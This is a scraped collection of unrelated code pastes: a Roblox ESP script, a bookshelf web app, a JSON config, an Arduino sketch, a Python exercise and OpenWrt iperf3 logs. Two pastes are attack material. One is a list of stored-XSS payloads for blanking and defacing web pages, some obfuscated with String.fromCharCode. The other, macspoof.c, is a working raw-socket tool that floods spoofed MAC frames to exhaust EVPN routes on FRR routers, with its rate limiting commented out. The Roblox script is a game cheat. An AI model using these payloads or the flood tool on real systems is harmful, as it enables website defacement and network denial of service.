   local TextLabel = Instance.new(""TextLabel"", Frame)
   
   BGui.Adornee = Character:WaitForChild(""Head"")
   BGui.StudsOffset = Vector3.new(0, 3, 0)
   BGui.AlwaysOnTop = true
   
   BGui.Size = UDim2.new(4, 0, 0.5, 0)
   Frame.Size = UDim2.new(1, 0, 1, 0)
   TextLabel.Size = UDim2.new(1, 0, 1, 0)
   
   Frame.BackgroundTransparency = 1
   TextLabel.BackgroundTransparency = 1
   
   TextLabel.Text = Character.Name
   TextLabel.Font = TextFont
   TextLabel.TextColor3 = NameColor
   TextLabel.TextScaled = NamePositioning
end

for i, v in ipairs(game:GetService(""Players""):GetPlayers()) do
   if v ~= game:GetService(""Players"").LocalPlayer then
       v.CharacterAdded:Connect(function(Character)
           if Outlines == true then
               AddOutline(Character)
           end
           if NameTags == true then
               AddNameTag(Character)
           end
       end)
       
       if v.Character then
           if Outlines == true then
               AddOutline(v.Character)
           end
           if NameTags == true then
               AddNameTag(v.Character)
           end
       end
   end
end

game:GetService(""Players"").PlayerAdded:Connect(function(Player)
   Player.CharacterAdded:Connect(function(Character)
       if Outlines == true then
           AddOutline(Character)
       end
       if NameTags == true then
           AddNameTag(Character)
       end
   end)
end)"
CcSag074,Untitled,athairrahman53,JavaScript,Sunday 31st of March 2024 05:12:24 PM CDT,"const books = [];
const RENDER_EVENT = ""render-books"";
const SAVED_STORAGE_KEY = ""books"";
const SAVED_EVENT = ""saved-books"";

// membuat fungsi untuk melihat localStorage dicukung atau tidak oleh webBrowsur
const isLocalStorageSupport = () => {
  if (typeof Storage === undefined) {
    alert(""Browsur kamu tidak mendukung local Storage"");
    return false;
  }
  return true;
};

// membuat fungsi untuk menyimpan data di localStorage
const booksSave = () => {
  if (isLocalStorageSupport()) {
    const parsed = JSON.stringify(books);
    localStorage.setItem(SAVED_STORAGE_KEY, parsed);
    document.dispatchEvent(new Event(SAVED_EVENT));
  }
};

const generateId = () => {
  return +new Date();
};

// membuat fungsi untuk menampung data book yang diinput
const inputBookObject = (id, title, author, year, isComplete) => {
  return {
    id,
    title,
    author,
    year,
    isComplete,
  };
};

// fungsi untuk melakukan letarasi pada index
const fineBookIndex = (bookId) =>
  books.findIndex((books) => books.id === bookId);

// fungsi hapus buku
const removeBookFromReadBook = (bookId) => {
  const bookTarget = fineBookIndex(bookId);
  if (bookTarget === -1) return;
  books.splice(bookTarget, 1);

  document.dispatchEvent(new Event(RENDER_EVENT));
  booksSave();
};

// fungsi pindahkan buku rak selesai dibaca
const moveBookToCompleted = (bookId) => {
  const bookTarget = fineBookIndex(bookId);
  if (bookTarget === -1) return;
  books[bookTarget].isComplete = true;
  document.dispatchEvent(new Event(RENDER_EVENT));
  booksSave();
};

// fungsi untuk mengembalikan buku ke book yang belum selesai;
const backToBookFromReadBook = (bookId) => {
  const bookTarget = fineBookIndex(bookId);
  if (bookTarget === null) return;
  books[bookTarget].isComplete = false;
  document.dispatchEvent(new Event(RENDER_EVENT));
  booksSave();
};

//
const updateBook = (bookId) => {
  const bookTarget = fineBookIndex(bookId);

  if (bookTarget === -1) return;

  const updateTitle = document.getElementById(""inputBookTitle"").value;
  const updateAuthor = document.getElementById(""inputBookAuthor"").value;
  const updateYears = document.getElementById(""inputBookYear"").value;
  const isComplete = document.getElementById(""inputBookIsComplete"").checked;

  books[bookTarget].title = updateTitle;
  books[bookTarget].author = updateAuthor;
  books[bookTarget].year = updateYears;
  books[bookTarget].isComplete = isComplete;

  document.dispatchEvent(new Event(RENDER_EVENT));
  booksSave();
};

// fungsi untuk mengambil element judul,penulis, tahun, dan ID
const inputDataBooks = () => {
  const isEditing =
    document.getElementById(""bookSubmit"").innerText === ""Edit Buku"";

  // const generatedID = generateId();

  const inputBookId = document.getElementById(""inputBookId"").value;
  const inputBookTitle = document.getElementById(""inputBookTitle"").value;
  const inputBookAuthor = document.getElementById(""inputBookAuthor"").value;
  const inputBookYear = parseInt(
    document.getElementById(""inputBookYear"").value
  );
  const inputBookIsComplete = document.getElementById(
    ""inputBookIsComplete""
  ).checked;

  if (isEditing) {
    // const bookIndek = books.findIndex((book) => book.id === generatedID);
    const bookIndek = fineBookIndex(inputBookId);

    if (bookIndek !== -1) {
      books[bookIndek].title = inputBookTitle;
      books[bookIndek].author = inputBookAuthor;
      books[bookIndek].year = inputBookYear;
      books[bookIndek].isComplete = inputBookIsComplete;

      document.getElementById(""bookSubmit"").innerText =
        ""Masukkan Buku ke rak <span>Belum selesai dibaca</span"";
      document.getElementById(""cancelEditBtn"").style.display = ""none"";
      booksSave();

      // Reset nilai input form
      document.getElementById(""inputBookId"").value = """";
      document.getElementById(""inputBookTitle"").value = """";
      document.getElementById(""inputBookAuthor"").value = """";
      document.getElementById(""inputBookYear"").value = """";
      document.getElementById(""inputBookIsComplete"").checked = false;
    }
  } else {
    const generatedID = generateId();

    const bookObject = inputBookObject(
      generatedID,
      inputBookTitle,
      inputBookAuthor,
      inputBookYear,
      inputBookIsComplete
    );

    books.push(bookObject);
    booksSave();
  }
  document.dispatchEvent(new Event(RENDER_EVENT));
};

// fungsi untuk mengload data dari localstorage ketika browsur dibuka kembali
const loadBookFromLocalStorage = () => {
  try {
    const serializedBooks = localStorage.getItem(SAVED_STORAGE_KEY);
    if (serializedBooks === null) {
      return null;
    }
    let parsedBooks = JSON.parse(serializedBooks);

    books.push(...parsedBooks);
    booksSave();
    document.dispatchEvent(new Event(RENDER_EVENT));
    return parsedBooks;
  } catch (error) {
    alert(""gagal dimuat data buku"", error);
    return null;
  }
};

//fungsi untuk menemukan id buku seseai dengan yang diingin di edit
const bookFromToEdit = (bookId) => {
  const bookToEdit = fineBookIndex(bookId);

  if (bookToEdit === null) return;

  document.getElementById(""inputBookId"").value = books[bookToEdit].id;
  document.getElementById(""inputBookTitle"").value = books[bookToEdit].title;
  document.getElementById(""inputBookAuthor"").value = books[bookToEdit].author;
  document.getElementById(""inputBookYear"").value = books[bookToEdit].year;
  document.getElementById(""inputBookIsComplete"").checked =
    books[bookToEdit].isComplete;

  const bookSubmit = document.getElementById(""bookSubmit"");
  bookSubmit.innerText = ""Simpan"";

  const updateBookHandler = () => {
    const bookId = books[bookToEdit].id;
    updateBook(bookId);
    bookSubmit.removeEventListener(""click"", updateBookHandler);
    location.reload(true);
  };

  // Remove any existing event listeners before adding a new one
  bookSubmit.removeEventListener(""click"", updateBookHandler);

  bookSubmit.addEventListener(""click"", updateBookHandler);
};

// fungsi untuk menampilkan data buku yang telah diinput
const displayBook = (dataBook, bookId) => {
  const bookTitle = document.createElement(""h3"");
  bookTitle.innerText = dataBook.title;

  const bookWriter = document.createElement(""p"");
  bookWriter.innerText = dataBook.author;

  const bookPublication = document.createElement(""p"");
  bookPublication.innerText = dataBook.year;

  // fungsi untuk membuat button
  const createButton = (text) => {
    const button = document.createElement(""Button"");
    button.innerText = text;
    button.classList.add(""material-symbols-outlined"");
    return button;
  };

  const clearBook = createButton(""delete"");
  const finisRead = createButton(""done"");
  const backButton = createButton(""undo"");

  const editBook = document.createElement(""Button"");
  editBook.innerText = ""edit"";
  editBook.classList.add(""material-symbols-outlined"");
  // menambahkan attribute data-book-id untuk menyimpan ID buku
  editBook.dataset.bookId = bookId;

  const action = document.createElement(""div"");
  action.classList.add(""action"");
  action.append(clearBook);

  if (dataBook.isComplete) {
    action.append(backButton);
    backButton.addEventListener(""click"", () => {
      backToBookFromReadBook(dataBook.id);
    });
  } else {
    action.append(finisRead, editBook);
    finisRead.addEventListener(""click"", () => {
      moveBookToCompleted(dataBook.id);
    });
    editBook.addEventListener(""click"", () => {
      bookFromToEdit(dataBook.id);
    });
  }
  const containerBookItem = document.createElement(""article"");
  containerBookItem.classList.add(""book_item"");
  containerBookItem.append(bookTitle, bookWriter, bookPublication);
  containerBookItem.append(action);
  containerBookItem.setAttribute(""id"", `book-${dataBook.id}`);

  clearBook.addEventListener(""click"", () => {
    Swal.fire({
      title: ""Apakah anda yakin?"",
      text: ""Anda tidak dapat mengembalikan lagi!"",
      icon: ""warning"",
      showCancelButton: true,
      confirmButtonColor: ""#3085d6"",
      cancelButtonColor: ""#d33"",
      confirmButtonText: ""Ya, hapus saja!"",
      cancelButtonText: ""Batal"",
    }).then((result) => {
      if (result.isConfirmed) {
        removeBookFromReadBook(dataBook.id);
        Swal.fire({
          title: ""Terhapus!"",
          text: ""Buku telah dihapus"",
          icon: ""success"",
        });
      } else {
        Swal.fire({
          title: ""Batal!"",
          icon: ""error"",
        });
      }
    });
  });
  return containerBookItem;
};

// fungsi untuk mencari judul buku
const searchBookTitle = document.getElementById(""searchBookTitle"");
searchBookTitle.addEventListener(""input"", () => {
  const keyword = searchBookTitle.value.toLowerCase();
  const filteredBooks = books.filter((book) =>
    book.title.toLowerCase().includes(keyword)
  );
  renderBooks(filteredBooks);
});

// fungsi untuk merender buku pada pencaharian
const renderBooks = (books) => {
  const incompleteBookshelfList = document.getElementById(
    ""incompleteBookshelfList""
  );
  incompleteBookshelfList.innerHTML = "" "";

  const completeBookshelfList = document.getElementById(
    ""completeBookshelfList""
  );
  completeBookshelfList.innerHTML = "" "";

  books.forEach((book) => {
    const bookElement = displayBook(book);

    if (book.isComplete) {
      completeBookshelfList.appendChild(bookElement);
    } else {
      incompleteBookshelfList.appendChild(bookElement);
    }
  });
};

// membuat event submit untuk melakukan penyimpanan data pada form yang telah diinput
document.addEventListener(""DOMContentLoaded"", () => {
  const inuputAllDataBook = document.getElementById(""inputBook"");
  inuputAllDataBook.addEventListener(""submit"", (e) => {
    e.preventDefault();
    Swal.fire({
      text: ""Terkirim"",
      icon: ""success"",
    });
    inputDataBooks();
  });

  if (isLocalStorageSupport()) {
    const loadedBooks = loadBookFromLocalStorage();
    if (!loadedBooks) {
      alert(""tidak ada buku yang disimpan"");
    }
  }
});

// Event untuk merender semua data
document.addEventListener(RENDER_EVENT, () => {
  const incompleteBookshelfList = document.getElementById(
    ""incompleteBookshelfList""
  );
  incompleteBookshelfList.innerHTML = "" "";

  const completeBookshelfList = document.getElementById(
    ""completeBookshelfList""
  );
  completeBookshelfList.innerHTML = "" "";

  for (const bookItem of books) {
    const bookElement = displayBook(bookItem);
    if (bookItem.isComplete) {
      completeBookshelfList.append(bookElement);
    } else {
      incompleteBookshelfList.append(bookElement);
    }
  }
});
"
AK3kKau2,Json_flix,Francisfranteresina,JSON,Sunday 31st of March 2024 05:08:46 PM CDT,"{
  ""url"": ""https://drive.google.com/file/d/1lxpQggHLi6t6lGc5h21YO-Mn1lg6BSTq/view?usp=drivesdk"",
  ""version"": ""1.0"",
  ""novidades"": ""○ Novo Layout
○ Novos Lançamentos
○ Sistema de favoritos
○ Chat gp"",
  ""breve"":""Sem planos no momento..."",
  ""nome"":""Json_flix""
}"
TrbSHPYu,Arduino nano script for BetterDamage,AnonKot,C++,Sunday 31st of March 2024 04:27:18 PM CDT,"#define shockPin 2
#define vibroPin 3


void setup()
{
  pinMode(2, OUTPUT);
  pinMode(3, OUTPUT);
  pinMode(LED_BUILTIN, OUTPUT);
  Serial.begin(115200) ;
  Serial.setTimeout(5);
}

void mark_click(int pin){
  digitalWrite(pin, HIGH);
   delay(90);
   digitalWrite(pin, LOW);
   delay(100);
}
void loop()
{	
  if(Serial.available()>1){
    char  key = Serial.read();
    int val = Serial.parseInt();
    switch (key){
      case 's': mark_click(shockPin);
		break;
      case 'v': mark_click(vibroPin);
      	break;
    }
  }
}"
hbQADALe,邀您一起看：图床设置,xiaomianao666,JavaScript,Sunday 31st of March 2024 04:04:26 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥图床设置@@
HEQC8xyV,XSS Stored,afrizalwahyuadi66,HTML,Sunday 31st of March 2024 03:24:46 PM CDT,"{Change Background Color}

<body style=""background-color:blue;"">
____________________________________________________________________________________________________________________________
____________________________________________________________________________________________________________________________
{Change Background Image}

<style>
div {
background-image: url('http://www.deepeddy.net/img/deepeddyfish.gif');
}
</style>
____________________________________________________________________________________________________________________________
____________________________________________________________________________________________________________________________
{Blanking a Web Page}

Note: document.documentElement.innerHTML contains all HTML of a web page. Setting it to equal to an empty string ("""") causes all HTML on that page to disappear.

<script>document.documentElement.innerHTML=""""</script>
____________________________________________________________________________________________________________________________
____________________________________________________________________________________________________________________________
{Defacing a Web Page by Injecting HTML Code}
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
<script>document.documentElement.innerHTML=""<html><h1>Hacked by saTaoz</h1>What do you think of me now?</html>""</script>

Alternate scripts:

<script>document.body.innerHTML=""<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED BY TED</h1></div>"";</script>

<script>document.body.innerHTML=""<h1>Hacked by saTaoz</h1>"";</script>
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
<script>document.documentElement.innerHTML=(String.fromCharCode(CharCode string goes here));</script>
Example :
<script>document.documentElement.innerHTML=(String.fromCharCode(72, 97, 99, 107, 101, 100, 32, 98, 121, 32, 115, 97, 84, 97, 111, 122));</script>
____________________________________________________________________________________________________________________________
____________________________________________________________________________________________________________________________
{Defacing a Web Page by Modifying the DOM and Injecting HTML Code}

<script> document.getElementById(""pageName"").innerHTML = ""Stay away from our page!<p><h4>You are where you do not belong.</h4></p>"";</script>

Example :
<script>document.getElementById(""main_body"").innerHTML = ""<h1>Hacking is not a crime!</h1>"";</script>
____________________________________________________________________________________________________________________________
"
MYZXhv9K,3 - P!rates,Nenogzar,Python,Sunday 31st of March 2024 03:14:13 PM CDT,""""""" Time: 0.050 s """"""

from collections import defaultdict
# import sys

def add_city(city_name, population, gold, cities):
    cities[city_name]['population'] += population
    cities[city_name]['gold'] += gold

def plunder_city(city_name, people, gold, cities):
    print(f""{city_name} plundered! {gold} gold stolen, {people} citizens killed."")
    cities[city_name]['population'] -= people
    cities[city_name]['gold'] -= gold

    if cities[city_name]['population'] <= 0 or cities[city_name]['gold'] <= 0:
        print(f""{city_name} has been wiped off the map!"")
        cities.pop(city_name)

def prosper_city(city_name, gold, cities):
    if gold < 0:
        print(f""Gold added cannot be a negative number!"")
    else:
        cities[city_name]['gold'] += gold
        print(f""{gold} gold added to the city treasury. {city_name} now has {cities[city_name]['gold']} gold."")

def process_commands(command, cities):
    action, city_name = command.split('=>')[0], command.split('=>')[1]

    if action == ""Plunder"":
        people, gold = map(int, command.split('=>')[2:])
        plunder_city(city_name, people, gold, cities)
    elif action == ""Prosper"":
        gold = int(command.split('=>')[2])
        prosper_city(city_name, gold, cities)


cities = defaultdict(lambda: {'population': 0, 'gold': 0})
info = input() # sys.stdin.readline().strip()

while info != ""Sail"":
    city_name, population, gold = info.split(""||"")
    add_city(city_name, int(population), int(gold), cities)
    info = input() # sys.stdin.readline().strip()

command = input() # sys.stdin.readline().strip()
while command != ""End"":
    process_commands(command, cities)
    command = input() # sys.stdin.readline().strip()

if cities:
    print(f""Ahoy, Captain! There are {len(cities)} wealthy settlements to go to:"")
    for city, city_info in cities.items():
        print(f""{city} -> Population: {city_info['population']} citizens, Gold: {city_info['gold']} kg"")
else:
    print(f""Ahoy, Captain! All targets have been plundered and destroyed!"")"
0U3TvT4G,macspoof.c,AlexGra,C,Sunday 31st of March 2024 02:52:51 PM CDT,"// This program will send spoofed ethernet packets in order to cause a flood of
// EVPN type 2 routes on a system that uses FRR and has the l2vpn evpn address
// family configured.
//
// The program is cleaned up version of: https://gist.github.com/austinmarton/1922600
// with some additions from: https://github.com/ispoleet/Network-Security/blob/master/Sniffing%20and%20Spoofing/spoof.c

#include <arpa/inet.h>
#include <getopt.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

/* type/enum definitions */
typedef unsigned char      byte;
typedef unsigned short int word;
typedef struct { byte *d; size_t l; } arr_t;                // buffer + size
enum TYPE {TYPE_ETHERNET, TYPE_ICMPECHO, TYPE_ALL, TYPE_UNDEFINED};

/*
**  chksum(): Calculate checksum of a specific buffer.
**
**  Arguments: buf (byte*)     : buffer to calculate its checksum
**             buflen (size_t) : buffer's size inb bytes
**
**  Return Value: The buffer's checksum in BIG endian.
*/
uint16_t chksum( byte buf[], size_t buflen ) {
    uint32_t sum = 0, i;                                // checksum, iterator

    if( buflen < 1 ) return 0;                          // if buffer is empty, exit

    for( i=0; i<buflen-1; i+=2 ) sum += *(word*)&buf[i];// add all half-words together  

    if( buflen & 1 ) sum += buf[buflen - 1];            // if you missed last byte, add it

    return ~((sum >> 16) + (sum & 0xffff));             // fold high to low order word
                                                        // return 1's complement
}
// ------------------------------------------------------------------------------------------------
/*
**  mk_ping_pkt(): Generate a ping packet, with a given payload.
**
**  Arguments: payload (arr_t) : Packet payload
**
**  Return Value: An arr_t pointer containing the complete ping packet
*/
arr_t mk_ping_pkt( arr_t payload ) {
    arr_t pkt = { 
        .d = malloc(sizeof(struct icmphdr) + payload.l),
        .l = sizeof(struct icmphdr) + payload.l 
    };
    struct icmphdr *icmph = (struct icmphdr*) pkt.d;


    /* fill ICMP header and calculate checksum on the whole packet */
    icmph->type     = ICMP_ECHO;                        // ICMP echo
    icmph->code     = 0;
    icmph->checksum = 0;                                // set to 0 for now
    
    /* copy packet payload */
    memcpy(&pkt.d[sizeof(struct icmphdr)], payload.d, payload.l);

    icmph->checksum = chksum(pkt.d, pkt.l);             // calc checksum now

    return pkt;                                         // return packet
}
// ------------------------------------------------------------------------------------------------
/*
**  mk_ip_pkt(): Generate an IP packet, with a given payload.
**
**  Arguments: src (char*)     : source IP address
**             dst (char*)     : destination IP address
**             proto (byte)    : upper layer protocol
**             payload (arr_t) : Packet payload
**
**  Return Value: An arr_t pointer containing the complete IP packet
*/
arr_t mk_ip_pkt( char *src, char *dst, byte proto, arr_t payload ) {
    arr_t pkt = { 
        .d = malloc(sizeof(struct iphdr) + payload.l),
        .l = sizeof(struct iphdr) + payload.l
    };
    struct iphdr *iph = (struct iphdr*) pkt.d;

    /* fill IP header */
    iph->version  = 4;
    iph->ihl      = 5;  
    iph->tos      = 0;
    iph->tot_len  = htons(pkt.l);                       // set packet's total length
    iph->id       = htons(9999);                        // set some ID
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = proto;                              // set upper layer protocol
    iph->check    = 0;                                  // set to 0 for now
    iph->saddr    = inet_addr(src);                     // spoofed source IP
    iph->daddr    = inet_addr(dst);                     // target's IP
    iph->check    = chksum(pkt.d, 20);                  // calculate checksum of the header

    /* copy packet payload */
    memcpy(&pkt.d[sizeof(struct iphdr)], payload.d, payload.l);

    return pkt;                                         // return packet
}


int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf(""Usage: %s interface_name src_ip dest_ip_addr dest_mac_addr num_ethernet_packets_to_send\n"", argv[0]);
        exit(1);
    }

    char* src_ip = argv[2];
    char* dst_ip = argv[3];

    int dst[6];
    if (6 != sscanf(argv[4], ""%x:%x:%x:%x:%x:%x"", &dst[0], &dst[1], &dst[2], &dst[3], &dst[4], &dst[5])) {
        printf(""Second argument must be a valid mac address in hex, e.g. 12:34:56:ab:cd:ef. Exiting.\n"");
        exit(2);
    }
    long long num_ethernet_packets_to_send = atoi(argv[5]);
    if (num_ethernet_packets_to_send == 0) {
        printf(""No packets to send or the number of packets was not a valid number."");
        exit(3);
    }

    int sockfd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	int tx_len = 0;
    const int BUF_SIZ = 1024; // Minimum frame size is 64 bytes.
    char sendbuf[BUF_SIZ];
	struct ether_header *eh = (struct ether_header *) sendbuf;
	//struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
	struct sockaddr_ll socket_address;
	char ifName[IFNAMSIZ];
    strcpy(ifName, argv[1]);

	/* Open RAW socket to send on */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
	    perror(""socket"");
	}

	/* Get the index of the interface to send on */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
	    perror(""SIOCGIFINDEX"");

	/* Get the MAC address of the interface to send on */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
	    perror(""SIOCGIFHWADDR"");

	/* Construct the Ethernet header */
	memset(sendbuf, 0, BUF_SIZ);

    for (int i = 0; i < 5; ++i)
    {
        eh->ether_dhost[i] = dst[i];
    }
    /* Ethertype field */
    eh->ether_type = htons(ETH_P_IP);
    tx_len += sizeof(struct ether_header);

    arr_t pkt = {.d = NULL, .l = 0};

    arr_t ip_pkt_part = mk_ip_pkt(src_ip, dst_ip, IPPROTO_ICMP, mk_ping_pkt(pkt));
    memcpy(sendbuf+tx_len, ip_pkt_part.d, ip_pkt_part.l);
    tx_len += ip_pkt_part.l;

    /* Append some more packet data */
    /*
    sendbuf[tx_len++] = 0xde;
    sendbuf[tx_len++] = 0xad;
    sendbuf[tx_len++] = 0xbe;
    sendbuf[tx_len++] = 0xef;
    */

    printf(""Packet length is: %d\n"", tx_len);

    /* Index of the network device */
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    /* Address length*/
    socket_address.sll_halen = ETH_ALEN;
    /* Destination MAC */
    for (int i = 0; i < 5; ++i)
    {
        socket_address.sll_addr[i] = dst[i];
    }

    // This can be used to set the source mac to the mac of the interface we send on.
    // However, we don't want that for this proof of concept.
    /* Ethernet header */
    // Interface mac address.
    eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
    eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
    eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
    eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
    eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
    eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];

    // Continue changing source mac while sending the same packet.
    //for (int i = 0; i < 5; ++i) {
        //eh->ether_shost[i] = 0x33;
    //}

    for (long long num_packets_sent = 0; num_packets_sent < num_ethernet_packets_to_send; ++num_packets_sent) {
        // Rate limiting to prevent this from being a bad attack!
        //printf(""Sleeping 1 second for rate limiting the attack.\n"");
        //sleep(1);
        // XXX: Be very careful in removing this.


        // Add one to the mac address and handle carry.
        for (int i = 5; i >= 0; --i) {
            if (eh->ether_shost[i] != 255) {
                // No carry.
                eh->ether_shost[i] += 1;
                break;
            }
            // A carry.
            eh->ether_shost[i] = 0;
        }

        if (num_packets_sent % 1000000 == 0) {
            printf(""Number of packets sent so far: %lld\n"", num_packets_sent);
        }

        /* Send packet */
        if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll)) < 0) {
            printf(""Send failed\n"");
        }
    }
    printf(""Done sending all packets: %lld\n"", num_ethernet_packets_to_send);
    return 0;
}"
3hpVrFY8,Netgear R6220 (mt7621ST),mar_w,Bash,Sunday 31st of March 2024 02:37:00 PM CDT," _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------------------------------
 |                                                                           |
 | OpenWrt 23.05-SNAPSHOT, r23780-6f70e09a00                                 |
 |                                                                           |
 | Build time: 2024-03-09 08:09 CET                                          |
 | Cezary Jackiewicz, https://eko.one.pl

#######################################################################################################

    ########## Bez HW_NAT ##########

#######################################################################################################

### NAT: (z klienta LAN-owego, przez router, do serwera) ###

$ iperf3 -c 192.168.76.1 -t 60 -i 60
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 33390 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  2.04 GBytes   292 Mbits/sec  261   1.59 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  2.04 GBytes   292 Mbits/sec  261             sender
[  5]   0.00-60.02  sec  2.04 GBytes   292 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -t 60 -i 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 52412 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  2.75 GBytes   394 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.01  sec  2.76 GBytes   395 Mbits/sec  182             sender
[  5]   0.00-60.00  sec  2.75 GBytes   394 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -t 60 -i 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 53030 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 53046 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  1.28 GBytes   184 Mbits/sec   86   1.41 MBytes       
[  7][RX-C]   0.00-60.00  sec  1.09 GBytes   156 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  1.28 GBytes   184 Mbits/sec   86             sender
[  5][TX-C]   0.00-60.00  sec  1.28 GBytes   183 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec  1.09 GBytes   156 Mbits/sec  296             sender
[  7][RX-C]   0.00-60.00  sec  1.09 GBytes   156 Mbits/sec                  receiver

iperf Done.

### WG (z klienta LAN-owego, przez router który jest peerem WG, do serwera WG) ###

$ iperf3 -c 10.9.0.1 -t 60 -i 60
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 43752 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   849 MBytes   119 Mbits/sec  513   1.23 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   849 MBytes   119 Mbits/sec  513             sender
[  5]   0.00-60.01  sec   847 MBytes   118 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -t 60 -i 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 49368 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   837 MBytes   117 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.06  sec   840 MBytes   117 Mbits/sec  300             sender
[  5]   0.00-60.00  sec   837 MBytes   117 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -t 60 -i 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 53800 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 53814 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   412 MBytes  57.7 Mbits/sec  207    969 KBytes       
[  7][RX-C]   0.00-60.00  sec   408 MBytes  57.1 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   412 MBytes  57.7 Mbits/sec  207             sender
[  5][TX-C]   0.00-60.05  sec   410 MBytes  57.3 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   412 MBytes  57.5 Mbits/sec  389             sender
[  7][RX-C]   0.00-60.05  sec   408 MBytes  57.1 Mbits/sec                  receiver

iperf Done.

### PPPoE + VLAN 35(z klienta LAN-owego, przez router który jest clientem PPPoE, do serwera PPPoE dodatkowo na tagowanych portach VLAN 35) ####

$ iperf3 -c 192.168.76.1 -i 60 -t 60
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 59596 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  1.72 GBytes   246 Mbits/sec  302    788 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  1.72 GBytes   246 Mbits/sec  302             sender
[  5]   0.00-60.02  sec  1.72 GBytes   246 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 44456 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   666 MBytes  93.1 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
